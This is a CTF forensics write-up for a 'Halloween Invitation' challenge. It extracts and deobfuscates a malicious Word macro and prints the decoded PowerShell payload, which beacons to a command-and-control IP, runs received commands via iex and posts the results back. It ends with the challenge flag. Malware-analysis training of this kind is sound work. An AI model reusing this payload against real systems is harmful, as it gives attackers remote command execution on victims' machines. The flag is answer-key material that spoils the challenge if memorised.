
- Ran `unzip ./invitation.docm` to view hidden contents of the Word document
- `custom.xml` has a hex string `0x01010079F111ED35F8CC479449609E8A0923A6`, but decoding the string didn't give anything useful
- Used `oletools` to extract macros from the document

   ```bash
    sudo pip3 install -U oletools
    olevba -c ./invitation.docm > macros.log
    ```

    The contents of the log file can be found [here](./assets/hackthebox/HackTheBoo2022/ForensicHalloweenInvitation/macros.log).

    The file yielded evidence that a hidden Powershell script would be executed when the document was opened (`AutoOpen`). The script opens a text file in the system temp directory, but I can't understand much more than that from the script because it has obviously been obfuscated.

- Used [`ViperMonkey`](https://github.com/decalage2/ViperMonkey) to deobfuscate the script:

    ```bash
    wget https://raw.githubusercontent.com/decalage2/ViperMonkey/master/docker/dockermonkey.sh
    chmod +x dockermonkey.sh
    sudo ./dockermonkey.sh ./invitation.docm
    ```

    This returned a ZIP file containing `history.bak`, which had the following content:

    ```base64
    JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=
    ```

    Interpreting that as base64 gave us the following:

    ```text
    $.s.=.'.7.7...7.4...1.9.8...5.2.:.8.0.8.0.'.;.$.i.=.'.d.4.3.b.c.c.6.d.-.0.4.3.f.2.4.0.9.-.7.e.a.2.3.a.2.c.'.;.$.p.=.'.h.t.t.p.:././.'.;.$.v.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.d.4.3.b.c.c.6.d. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.;.w.h.i.l.e. .(.$.t.r.u.e.).{.$.c.=.(.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.0.4.3.f.2.4.0.9. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.).;.i.f. .(.$.c. .-.n.e. .'.N.o.n.e.'.). .{.$.r.=.i.e.x. .$.c. .-.E.r.r.o.r.A.c.t.i.o.n. .S.t.o.p. .-.E.r.r.o.r.V.a.r.i.a.b.l.e. .e.;.$.r.=.O.u.t.-.S.t.r.i.n.g. .-.I.n.p.u.t.O.b.j.e.c.t. .$.r.;.$.t.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.r.i. .$.p.$.s./.7.e.a.2.3.a.2.c. .-.M.e.t.h.o.d. .P.O.S.T. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}. .-.B.o.d.y. .(.[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.T.F.8...G.e.t.B.y.t.e.s.(.$.e.+.$.r.). .-.j.o.i.n. .'. .'.).}. .s.l.e.e.p. .0...8.}.H.T.B.{.5.u.p.3.r._.3.4.5.y._.m.4.c.r.0.5.}.
    ```

    From that we were able to get the flag:

    ```text
    HTB{5up3r_345y_m4cr05}
    ```

## Resources

- https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis
- https://www.decalage.info/en/vba_emulation
